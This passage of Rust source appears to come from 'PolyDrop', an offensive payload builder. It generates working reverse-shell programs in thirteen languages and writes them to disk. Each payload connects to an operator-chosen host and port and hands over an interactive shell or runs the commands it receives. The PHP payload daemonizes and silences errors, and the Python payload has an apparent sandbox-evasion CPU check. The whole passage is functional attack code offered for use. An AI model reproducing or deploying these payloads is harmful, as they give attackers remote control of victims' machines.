        let php_revshell = format!("<?php\nclass Shell {{\n\tprivate $addr = null;\n\tprivate $port = null;\n\tprivate $os= null;\n\tprivate $shell = null;\n\tprivate $descriptorspec = array(\n\t\t0 => array('pipe', 'r'),\n\t\t1 => array('pipe', 'w'),\n\t\t2 => array('pipe', 'w')\n\t);\n\tprivate $buffer = 1024;\n\tprivate $clen = 0;\n\tprivate $error = false;\n\tprivate $sdump = true;\n\tpublic function __construct($addr, $port) {{\n\t\t$this->addr = $addr;\n\t\t$this->port = $port;\n\t}}\n\tprivate function detect() {{\n\t\t$detected = true;\n\t\t$os = PHP_OS;\n\t\tif (stripos($os, 'LINUX') !== false || stripos($os, 'DARWIN') !== false) {{\n\t\t\t$this->os= 'LINUX';\n\t\t\t$this->shell = '/bin/sh';\n\t\t}} else if (stripos($os, 'WINDOWS') !== false || stripos($os, 'WINNT') !== false || stripos($os, 'WIN32') !== false) {{\n\t\t\t$this->os= 'WINDOWS';\n\t\t\t$this->shell = 'cmd.exe';\n\t\t}} else {{\n\t\t\t$detected = false;\n\t\t\techo \"SYS_ERROR: Underlying operating system is not supported, script will now exit...\\n\";\n\t\t}}\n\t\treturn $detected;\n\t}}\n\tprivate function daemonize() {{\n\t\t$exit = false;\n\t\tif (!function_exists('pcntl_fork')) {{\n\t\t\techo \"DAEMONIZE: pcntl_fork() does not exists, moving on...\\n\";\n\t\t}} else if (($pid = @pcntl_fork()) < 0) {{\n\t\t\techo \"DAEMONIZE: Cannot fork off the parent process, moving on...\\n\";\n\t\t}} else if ($pid > 0) {{\n\t\t\t$exit = true;\n\t\t\techo \"DAEMONIZE: Child process forked off successfully, parent process will now exit...\\n\";\n\t\t}} else if (posix_setsid() < 0) {{\n\t\t\techo \"DAEMONIZE: Forked off the parent process but cannot set a new SID, moving on as an orphan...\\n\";\n\t\t}} else {{\n\t\t\techo \"DAEMONIZE: Completed successfully!\\n\";\n\t\t}}\n\t\treturn $exit;\n\t}}\n\tprivate function settings() {{\n\t\t@error_reporting(0);\n\t\t@set_time_limit(0);\n\t\t@umask(0);\n\t}}\n\tprivate function dump($data) {{\n\t\tif ($this->sdump) {{\n\t\t\t$data = str_replace('<', '&lt;', $data);\n\t\t\t$data = str_replace('>', '&gt;', $data);\n\t\t\techo $data;\n\t\t}}\n\t}}\n\tprivate function read($stream, $name, $buffer) {{\n\t\tif (($data = @fread($stream, $buffer)) === false) {{\n\t\t\t$this->error = true;\n\t\t\techo \"STRM_ERROR: Cannot read from {{$name}}, script will now exit...\\n\";\n\t\t}}\n\t\treturn $data;\n\t}}\n\tprivate function write($stream, $name, $data) {{\n\t\tif (($bytes = @fwrite($stream, $data)) === false) {{\n\t\t\t$this->error = true;\n\t\t\techo \"STRM_ERROR: Cannot write to {{$name}}, script will now exit...\\n\";\n\t\t}}\n\t\treturn $bytes;\n\t}}\n\tprivate function rw($input, $output, $iname, $oname) {{\n\t\twhile (($data = $this->read($input, $iname, $this->buffer)) && $this->write($output, $oname, $data)) {{\n\t\t\tif ($this->os === 'WINDOWS' && $oname === 'STDIN') {{ $this->clen += strlen($data); }}\n\t\t\t$this->dump($data);\n\t\t}}\n\t}}\n\tprivate function brw($input, $output, $iname, $oname) {{\n\t\t$size = fstat($input)['size'];\n\t\tif ($this->os === 'WINDOWS' && $iname === 'STDOUT' && $this->clen) {{\n\t\t\twhile ($this->clen > 0 && ($bytes = $this->clen >= $this->buffer ? $this->buffer : $this->clen) && $this->read($input, $iname, $bytes)) {{\n\t\t\t\t$this->clen -= $bytes;\n\t\t\t\t$size -= $bytes;\n\t\t\t}}\n\t\t}}\n\t\twhile ($size > 0 && ($bytes = $size >= $this->buffer ? $this->buffer : $size) && ($data = $this->read($input, $iname, $bytes)) && $this->write($output, $oname, $data)) {{\n\t\t\t$size -= $bytes;\n\t\t\t$this->dump($data);\n\t\t}}\n\t}}\n\tpublic function run() {{\n\t\tif ($this->detect() && !$this->daemonize()) {{\n\t\t\t$this->settings();\n\t\t\t$socket = @fsockopen($this->addr, $this->port, $errno, $errstr, 30);\n\t\t\t@fwrite($socket, \"PolyDrop Connection from PHP Payload\n\");\n\t\t\tif (!$socket) {{\n\t\t\t\techo \"SOC_ERROR: {{$errno}}: {{$errstr}}\\n\";\n\t\t\t}} else {{\n\t\t\t\tstream_set_blocking($socket, false);\n\t\t\t\t$process = @proc_open($this->shell, $this->descriptorspec, $pipes, null, null);\n\t\t\t\tif (!$process) {{\n\t\t\t\t\techo \"PROC_ERROR: Cannot start the shell\\n\";\n\t\t\t\t}} else {{\n\t\t\t\t\tforeach ($pipes as $pipe) {{\n\t\t\t\t\t\tstream_set_blocking($pipe, false);\n\t\t\t\t\t}}\n\t\t\t\t\t$status = proc_get_status($process);\n\t\t\t\t\t@fwrite($socket, \"SOCKET: Shell has connected! PID: {{$status['pid']}}\\n\");\n\t\t\t\t\tdo {{\n\t\t\t\t\t\t$status = proc_get_status($process);\n\t\t\t\t\t\tif (feof($socket)) {{\n\t\t\t\t\t\t\techo \"SOC_ERROR: Shell connection has been terminated\\n\"; break;\n\t\t\t\t\t\t}} else if (feof($pipes[1]) || !$status['running']) {{\n\t\t\t\t\t\t\techo \"PROC_ERROR: Shell process has been terminated\\n\";break;\n\t\t\t\t\t\t}}\n\t\t\t\t\t\t$streams = array(\n\t\t\t\t\t\t\t'read' => array($socket, $pipes[1], $pipes[2]),\n\t\t\t\t\t\t\t'write' => null,\n\t\t\t\t\t\t\t'except' => null\n\t\t\t\t\t\t);\n\t\t\t\t\t\t$num_changed_streams = @stream_select($streams['read'], $streams['write'], $streams['except'], 0);\n\t\t\t\t\t\tif ($num_changed_streams === false) {{\n\t\t\t\t\t\t\techo \"STRM_ERROR: stream_select() failed\\n\"; break;\n\t\t\t\t\t\t}} else if ($num_changed_streams > 0) {{\n\t\t\t\t\t\t\tif ($this->os === 'LINUX') {{\n\t\t\t\t\t\t\t\tif (in_array($socket , $streams['read'])) {{ $this->rw($socket , $pipes[0], 'SOCKET', 'STDIN' ); }}\n\t\t\t\t\t\t\t\tif (in_array($pipes[2], $streams['read'])) {{ $this->rw($pipes[2], $socket , 'STDERR', 'SOCKET'); }}\n\t\t\t\t\t\t\t\tif (in_array($pipes[1], $streams['read'])) {{ $this->rw($pipes[1], $socket , 'STDOUT', 'SOCKET'); }}\n\t\t\t\t\t\t\t}} else if ($this->os === 'WINDOWS') {{\n\t\t\t\t\t\t\t\tif (in_array($socket, $streams['read'])/*------*/) {{ $this->rw ($socket , $pipes[0], 'SOCKET', 'STDIN' ); }}\n\t\t\t\t\t\t\t\tif (($fstat = fstat($pipes[2])) && $fstat['size']) {{ $this->brw($pipes[2], $socket , 'STDERR', 'SOCKET'); }}\n\t\t\t\t\t\t\t\tif (($fstat = fstat($pipes[1])) && $fstat['size']) {{ $this->brw($pipes[1], $socket , 'STDOUT', 'SOCKET'); }}\n\t\t\t\t\t\t\t}}\n\t\t\t\t\t\t}}\n\t\t\t\t\t}} while (!$this->error);\n\t\t\t\t\tforeach ($pipes as $pipe) {{\n\t\t\t\t\t\tfclose($pipe);\n\t\t\t\t\t}}\n\t\t\t\t\tproc_close($process);\n\t\t\t\t}}\n\t\t\t\tfclose($socket);\n\t\t\t}}\n\t\t}}\n\t}}\n}}\necho '<pre>';\n$sh = new Shell('{}', {});\n$sh->run();\nunset($sh);\necho '</pre>';\n?>", &lhostarg, &lportarg);
        let crystal_revshell = format!("require \"process\"\nrequire \"socket\"\n\nc = Socket.tcp(Socket::Family::INET)\nc.connect(\"{}\", {})\nc.puts(\"PolyDrop Connection from Crystal Payload\")\nloop do\n\tm, l = c.receive\n\tp = Process.new(m.rstrip(\"\\n\"), output:Process::Redirect::Pipe, shell:true)\n\tc << p.output.gets_to_end\nend", &lhostarg, &lportarg);
        let julia_revshell = format!("using Sockets\n\nc = connect(\"{}\", {});\nmessage = \"PolyDrop Connection from Julia Payload\"\nmessage_bytes = string(message) |> x -> convert(Vector{{UInt8}}, x)\nwrite(c, message_bytes)\nwhile true\n\tcmd = readline(c, keep=true);\n\ttry\n\t\tprintln(c, read(`sh -c $cmd`, String));\n\tcatch e\n\t\tprint(c, e)\n\tend\nend", &lhostarg, &lportarg);
        let go_revshell = format!("package main;import\"os/exec\";import \"net\";import \"fmt\";func main(){{c,_:=net.Dial(\"tcp\",\"{}:{}\");message := \"PolyDrop Connection from Golang Payload\\n\";_, err := fmt.Fprintf(c, message);if err != nil {{fmt.Printf(\"Error sending message: %v\\n\", err);return}};cmd:=exec.Command(\"sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}}", &lhostarg, &lportarg);
        let dart_revshell = format!("import 'dart:io';\nimport 'dart:convert';\n\nmain() {{\n\tSocket.connect(\"{}\", {}).then((socket) {{\n\t\tvar message = \"PolyDrop Connection from Dart Payload\n\";var messageBytes = utf8.encode(message);socket.add(messageBytes);socket.listen((data) {{\n\t\t\tProcess.start('sh', []).then((Process process) {{\n\t\t\t\tprocess.stdin.writeln(new String.fromCharCodes(data).trim());\n\t\t\t\tprocess.stdout\n\t\t\t\t\t.transform(utf8.decoder)\n\t\t\t\t\t.listen((output) {{ socket.write(output); }});\n\t\t\t}});\n\t\t}},\n\t\tonDone: () {{\n\t\t\tsocket.destroy();\n\t\t}});\n\t}});\n}}", &lhostarg, &lportarg);
        let d_revshell = format!("import std.process, std.socket, std.conv;\n\nvoid main()\n{{\n\tSocket sock = new TcpSocket(new InternetAddress(\"{}\", {}));\n\tstring message = \"PolyDrop Connection from D-Lang Payload\n\";auto messageBytes = message.toUTF8();sock.send(messageBytes);\n\twhile (true)\n\t{{\n\t\tchar[] line;\n\t\tchar[1] buf;\n\t\twhile(sock.receive(buf))\n\t\t{{\n\t\t\tline ~= buf;\n\t\t\tif (buf[0] == '\\n')\n\t\t\t\tbreak;\n\t\t}}\n\t\tif (!line.length)\n\t\t\tbreak;\n\n\t\tauto os = executeShell(line);\n\t\tsock.send(os.output);\n\t}}\n}}", &lhostarg, &lportarg);
        let v_revshell = format!("module main\n\nimport net\nimport io\nimport os\n\nfn exec(path string) string {{\n\tmut out := ''\n\tmut line := ''\n\tmut cmd := os.Command{{\n\t\tpath: path\n\t}}\n\tcmd.start() or {{ panic(err) }}\n\n\tfor {{\n\t\tline = cmd.read_line()\n\t\tout += line + '\\n'\n\t\tif cmd.eof {{\n\t\t\treturn out\n\t\t}}\n\t}}\n\treturn out\n}}\n\nfn main() {{\n\tmut conn := net.dial_tcp('{}:{}')!\n\tmessage := \"PolyDrop Connection from V-Lang Payload\\n\";message_bytes := message.bytes();conn.write(message_bytes)!\n\tmut reader := io.new_buffered_reader(reader: conn)\n\tfor {{\n\t\tresult := reader.read_line() or {{ return }}\n\t\tconn.write_string(exec(result) + '\n') or {{ return }}\n\t}}\n}}", &lhostarg, &lportarg);
        let node_revshell = format!("(function(){{\n\tvar net = require(\"net\"),\n\t\tcp = require(\"child_process\"),\n\t\tsh = cp.spawn(\"sh\", []);\n\tvar client = new net.Socket();\n\tclient.connect({}, \"{}\", function(){{\n\t\tconst message = \"PolyDrop Connection from Node.js Payload\\n\";client.write(message);\n\t\tclient.pipe(sh.stdin);\n\t\tsh.stdout.pipe(client);\n\t\tsh.stderr.pipe(client);\n\t}});\n\treturn /a/;\n}})();", &lportarg, &lhostarg);
        let bun_revshell = format!("const net = require('net');\nconst {{ exec }} = require('child_process');\n\nconst IP = '{}';\nconst PORT = {};\n\nconst client = new net.Socket();\n\nclient.connect(PORT, IP, () => {{\n\tconsole.log('Connected to server');\n\tclient.write('PolyDrop Connection from Bun Payload\\n');\n}});\n\nclient.on('data', (data) => {{\n\texec(data.toString(), (error, stdout, stderr) => {{\n\t\tif (error) {{\n\t\t\tclient.write(`Error: ${{error.message}}\n`);\n\t\t\treturn;\n\t\t}}\n\t\tif (stderr) {{\n\t\t\tclient.write(`Stderr: ${{stderr}}\n`);\n\t\t\treturn;\n\t\t}}\n\t\tclient.write(stdout);\n\t}});\n}});\n\nclient.on('close', () => {{\n\tconsole.log('Connection closed');\n\tprocess.exit(0);\n}});", &lhostarg, &lportarg);
        let python_revshell = format!("import os\nimport socket\nimport subprocess\n\nif os.cpu_count() <= 2:\n\tquit()\n\nHOST = '{}'\nPORT = {}\n\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\ns.connect((HOST, PORT))\nmessage = \"PolyDrop Connection from Python Payload\\n\";s.sendall(message.encode())\n\nwhile 1:\n\ttry:\n\t\ts.send(str.encode(os.getcwd() + \"> \"))\n\t\tdata = s.recv(1024).decode(\"UTF-8\")\n\t\tdata = data.strip('\\n')\n\t\tif data == \"quit\": \n\t\t\tbreak\n\t\tif data[:2] == \"cd\":\n\t\t\tos.chdir(data[3:])\n\t\tif len(data) > 0:\n\t\t\tproc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)\n\t\t\tstdout_value = proc.stdout.read() + proc.stderr.read()\n\t\t\toutput_str = str(stdout_value, \"UTF-8\")\n\t\t\ts.send(str.encode(\"\\n\" + output_str))\n\texcept Exception as e:\n\t\tcontinue\n\ns.close()", &lhostarg, &lportarg);
        let fsharp_revshell = format!("open System\nopen System.Net\nopen System.Diagnostics\n\nlet rec asyncStdin (stream: System.Net.Sockets.NetworkStream, cmd: Process) =\n\tasync {{\n\t\tlet input = stream.ReadByte() |> Char.ConvertFromUtf32\n\t\tcmd.StandardInput.Write(input)\n\n\t\treturn! asyncStdin (stream, cmd)\n\t}}\n\nlet rec asyncStdout (stream: System.Net.Sockets.NetworkStream, cmd: Process) =\n\tasync {{\n\t\tlet output = cmd.StandardOutput.Read() |> Char.ConvertFromUtf32\n\t\tlet outbyte = System.Text.Encoding.UTF32.GetBytes(output)\n\t\tstream.Write(outbyte, 0, outbyte.Length)\n\n\t\treturn! asyncStdout (stream, cmd)\n\t}}\n\nlet main =\n\tlet client = new System.Net.Sockets.TcpClient()\n\n\tclient.Connect(\"{}\", {})\n\n\tlet stream = client.GetStream()\n\tlet message = \"PolyDrop Connection from F# Payload\\n\";let messageBytes = Encoding.UTF8.GetBytes(message);stream.Write(messageBytes, 0, messageBytes.Length)\n\t\n\tlet procStartInfo = ProcessStartInfo (\n\t\tFileName = \"/bin/sh\",\n\t\tRedirectStandardInput = true,\n\t\tRedirectStandardOutput = true,\n\t\tRedirectStandardError = true,\n\t\tUseShellExecute = false,\n\t\tCreateNoWindow = true\n\t)\n\n\tlet cmd = new Process(StartInfo = procStartInfo)\n\tlet err = cmd.Start()\n\n\tasyncStdin (stream, cmd) |> Async.Start\n\tasyncStdout (stream, cmd) |> Async.RunSynchronously\n\n\tstream.Flush()\n\n\tSystem.Threading.Thread.Sleep(TimeSpan.FromSeconds(30.0))\n\nmain", &lhostarg, &lportarg);
        let deno_revshell = format!("const IP = \"{}\";\nconst PORT = {};\n\nasync function connect(ip: string, port: number) {{\n\tconst conn = await Deno.connect({{ hostname: ip, port: port }});\n\tconsole.log(`Connected to ${{ip}}:${{port}}`);\n\n\tawait conn.write(new TextEncoder().encode(\"PolyDrop Connection from Deno Payload\\n\"));\n\n\tconst buffer = new Uint8Array(1024);\n\twhile (true) {{\n\t\tconst n = await conn.read(buffer);\n\t\tif (n === null) break;\n\t\tconst command = new TextDecoder().decode(buffer.subarray(0, n)).trim();\n\t\tconsole.log(`Received: ${{command}}`);\n\n\t\ttry {{\n\t\t\tconst process = Deno.run({{\n\t\t\t\tcmd: [\"sh\", \"-i\", command],\n\t\t\t\tstdout: \"piped\",\n\t\t\t\tstderr: \"piped\",\n\t\t\t}});\n\n\t\t\tconst output = await process.output();\n\t\t\tconst error = await process.stderrOutput();\n\n\t\t\tconst combinedOutput = new Uint8Array([...output, ...error]);\n\t\t\tawait conn.write(combinedOutput);\n\n\t\t\tprocess.close();\n\t\t}} catch (err) {{\n\t\t\tawait conn.write(new TextEncoder().encode(`Error: ${{err.message}}\n`));\n\t\t}}\n\t}}\n\n\tconn.close();\n}}\n\nconnect(IP, PORT);", &lhostarg, &lportarg);
        let reverse_shell = payloads::Codex::new(
            &tcl_revshell,
            &php_revshell,
            &crystal_revshell,
            &julia_revshell,
            &go_revshell,
            &dart_revshell,
            &d_revshell,
            &v_revshell,
            &node_revshell,
            &bun_revshell,
            &python_revshell,
            &fsharp_revshell,
            &deno_revshell,
        );
        let p_res = if language == "tcl" {
            mac_payloads.tcl_payload()
        } else if language == "php" {
            mac_payloads.php_payload()
        } else if language == "crystal" {
            mac_payloads.crystal_payload()
        } else if language == "julia" {
            mac_payloads.julia_payload()
        } else if language == "golang" {
            mac_payloads.go_payload()
        } else if language == "dart" {
            mac_payloads.dart_payload()
        } else if language == "dlang" {
            mac_payloads.d_payload()
        } else if language == "vlang" {
            mac_payloads.v_payload()
        } else if language == "nodejs" {
            mac_payloads.node_payload()
        } else if language == "bun" {
            mac_payloads.bun_payload()
        } else if language == "python" {
            mac_payloads.python_payload()
        } else if language == "fsharp" {
            mac_payloads.fsharp_payload()
        } else if language == "deno" {
            mac_payloads.deno_payload()
        } else if language == "empty" {
            "Building payload for every language...".to_string()
        } else {
            arguments::getargs()
        }
        .to_string();

        let p_shell = if language == "tcl" {
            reverse_shell.tcl_revshell()
        } else if language == "php" {
            reverse_shell.php_revshell()
        } else if language == "crystal" {
            reverse_shell.crystal_revshell()
        } else if language == "julia" {
            reverse_shell.julia_revshell()
        } else if language == "golang" {
            reverse_shell.go_revshell()
        } else if language == "dart" {
            reverse_shell.dart_revshell()
        } else if language == "dlang" {
            reverse_shell.d_revshell()
        } else if language == "vlang" {
            reverse_shell.v_revshell()
        } else if language == "nodejs" {
            reverse_shell.node_revshell()
        } else if language == "bun" {
            reverse_shell.bun_revshell()
        } else if language == "python" {
            reverse_shell.python_revshell()
        } else if language == "fsharp" {
            reverse_shell.f_revshell()
        } else if language == "dano" {
            reverse_shell.deno_revshell()
        } else if language == "empty" {
            "Building payload for every language...".to_string()
        } else {
            arguments::getargs()
        }
        .to_string();

        let p_ext = if language == "tcl" {
            ".tcl".to_string()
        } else if language == "php" {
            ".php".to_string()
        } else if language == "crystal" {
            ".cr".to_string()
        } else if language == "julia" {
            ".jl".to_string()
        } else if language == "golang" {
            ".go".to_string()
        } else if language == "dart" {
            ".dart".to_string()
        } else if language == "dlang" {
            ".d".to_string()
        } else if language == "vlang" {
            ".v".to_string()
        } else if language == "nodejs" {
            ".js".to_string()
        } else if language == "bun" {
            ".tsx".to_string()
        } else if language == "python" {
            ".py".to_string()
        } else if language == "fsharp" {
            ".fsx".to_string()
        } else if language == "deno" {
            ".ts".to_string()
        } else if language == "empty" {
            "Building payload for every language...".to_string()
        } else {
            arguments::getargs()
        }
        .to_string();

        let ext = if payload == "pwsh" || payload == "PowerShell" || payload == "powershell" {
            ".ps1"
        } else {
            ".sh"
        }
        .to_string();
        let outfile = output.to_string() + &ext;
        let revfile = output.to_string() + &p_ext;
        if allarg == "true" {
            for payload in [
                &mac_payloads.tcl_payload(),
                &mac_payloads.php_payload(),
                &mac_payloads.crystal_payload(),
                &mac_payloads.julia_payload(),
                &mac_payloads.go_payload(),
                &mac_payloads.dart_payload(),
                &mac_payloads.d_payload(),
                &mac_payloads.v_payload(),
                &mac_payloads.node_payload(),
                &mac_payloads.bun_payload(),
                &mac_payloads.python_payload(),
                &mac_payloads.fsharp_payload(),
                &mac_payloads.deno_payload(),
            ]
            .iter()
            {
                //println!("{}", payload);
                // Open a file with append option
                let mut data_file = OpenOptions::new()
                    .create(true)
                    .append(true)
                    .open(&outfile)
                    .expect("cannot open file");

                // Write to a file
                data_file
                    .write_all(payload.as_bytes())
                    .expect("write failed");
            }
            let source_array = [
                &reverse_shell.tcl_revshell(),
                &reverse_shell.php_revshell(),
                &reverse_shell.crystal_revshell(),
                &reverse_shell.julia_revshell(),
                &reverse_shell.go_revshell(),
                &reverse_shell.dart_revshell(),
                &reverse_shell.d_revshell(),
                &reverse_shell.v_revshell(),
                &reverse_shell.node_revshell(),
                &reverse_shell.bun_revshell(),
                &reverse_shell.python_revshell(),
                &reverse_shell.f_revshell(),
                &reverse_shell.deno_revshell(),
            ];
            let ext_array = [
                ".tcl".to_string(),
                ".php".to_string(),
                ".cr".to_string(),
                ".jl".to_string(),
                ".go".to_string(),
                ".dart".to_string(),
                ".d".to_string(),
                ".v".to_string(),
                ".js".to_string(),
                ".tsx".to_string(),
                ".py".to_string(),
                ".fsx".to_string(),
                ".ts".to_string(),
            ];
            for (revcode, revext) in source_array.iter().zip(ext_array.iter()) {
                let payloadfile = output.to_string() + &revext;
                let mut revshell_source =
                    std::fs::File::create(payloadfile).expect("create failed");
                revshell_source
                    .write_all(revcode.as_bytes())
                    .expect("write failed");
            }
        } else {
            println!("{}", outfile);
            let mut payload_main = std::fs::File::create(outfile).expect("create failed");
            payload_main
                .write_all(p_res.as_bytes())
                .expect("write failed");
            let mut revshell_source = std::fs::File::create(revfile).expect("create failed");
            revshell_source
                .write_all(p_shell.as_bytes())
                .expect("write failed");
        }
    } else {
        arguments::getargs();
    }
}
